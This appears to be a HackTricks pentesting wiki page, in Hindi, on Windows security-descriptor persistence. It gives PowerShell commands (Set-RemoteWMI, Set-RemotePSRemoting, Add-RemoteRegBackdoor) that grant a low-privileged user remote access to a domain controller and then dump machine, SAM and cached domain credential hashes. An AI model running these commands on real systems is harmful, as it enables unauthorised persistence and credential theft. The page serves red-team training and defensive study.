# सुरक्षा वर्णनकर्ता

{{#include ../../banners/hacktricks-training.md}}

## सुरक्षा वर्णनकर्ता

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): सुरक्षा वर्णनकर्ता परिभाषा भाषा (SDDL) उस प्रारूप को परिभाषित करती है जिसका उपयोग सुरक्षा वर्णनकर्ता का वर्णन करने के लिए किया जाता है। SDDL DACL और SACL के लिए ACE स्ट्रिंग्स का उपयोग करता है: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**सुरक्षा वर्णनकर्ता** का उपयोग **अनुमतियों** को **स्टोर** करने के लिए किया जाता है जो एक **वस्तु** के पास **एक** **वस्तु** पर है। यदि आप एक वस्तु के **सुरक्षा वर्णनकर्ता** में **थोड़ा बदलाव** कर सकते हैं, तो आप उस वस्तु पर बहुत दिलचस्प विशेषाधिकार प्राप्त कर सकते हैं बिना किसी विशेषाधिकार प्राप्त समूह का सदस्य बने।

फिर, यह स्थायी तकनीक उन विशेषाधिकारों को जीतने की क्षमता पर आधारित है जो कुछ वस्तुओं के खिलाफ आवश्यक हैं, ताकि एक कार्य को करने में सक्षम हो सकें जो आमतौर पर प्रशासनिक विशेषाधिकार की आवश्यकता होती है लेकिन बिना प्रशासनिक होने की आवश्यकता के।

### WMI तक पहुँच

आप एक उपयोगकर्ता को **दूरस्थ रूप से WMI निष्पादित करने** के लिए [**इसका उपयोग करके**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) पहुँच दे सकते हैं:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

**winrm PS कंसोल को एक उपयोगकर्ता को एक्सेस दें** [**इसका उपयोग करके**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote access to hashes

**रजिस्ट्री** तक पहुँचें और **हैशेस** को **DAMP** का उपयोग करके **Reg बैकडोर बनाकर** **डंप** करें, ताकि आप किसी भी समय **कंप्यूटर का हैश**, **SAM** और कंप्यूटर में किसी भी **कैश किए गए AD** क्रेडेंशियल को पुनः प्राप्त कर सकें। इसलिए, यह **डोमेन कंट्रोलर कंप्यूटर** के खिलाफ एक **सामान्य उपयोगकर्ता** को यह अनुमति देना बहुत उपयोगी है:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
चेक करें [**Silver Tickets**](silver-ticket.md) यह जानने के लिए कि आप एक डोमेन कंट्रोलर के कंप्यूटर खाते के हैश का उपयोग कैसे कर सकते हैं।

{{#include ../../banners/hacktricks-training.md}}
